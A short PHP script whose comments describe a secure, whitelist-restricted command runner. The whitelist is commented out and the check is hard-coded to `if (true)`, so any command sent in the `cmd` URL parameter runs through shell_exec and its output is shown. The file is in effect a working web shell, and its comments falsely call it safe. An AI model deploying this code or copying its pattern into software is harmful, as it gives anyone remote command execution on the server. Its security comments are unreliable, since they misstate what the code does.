<?php
// Define allowed commands in a whitelist for security
// $allowed_commands = [
//     'date',         // Gets the current date and time
//     'uptime',       // Gets server uptime
//     'whoami',       // Shows the user under which the PHP process is running
//     'ls',           // Lists files in a directory (restricted by the argument below)
// ];

// Check if 'cmd' parameter is set in the URL
if (isset($_GET['cmd'])) {
    // Get the command from the URL
    $command = $_GET['cmd'];

    // Validate that the command is in the whitelist
    if (true) {
        // Execute the command safely using escapeshellcmd
        $output = shell_exec(escapeshellcmd($command));

        // Display the output
        echo "<pre>$output</pre>";
    } else {
        // If the command is not allowed, show an error
        echo "Invalid command specified.";
    }
} else {
    // If 'cmd' parameter is not set, show a message
    echo "No command specified.";
}
?>
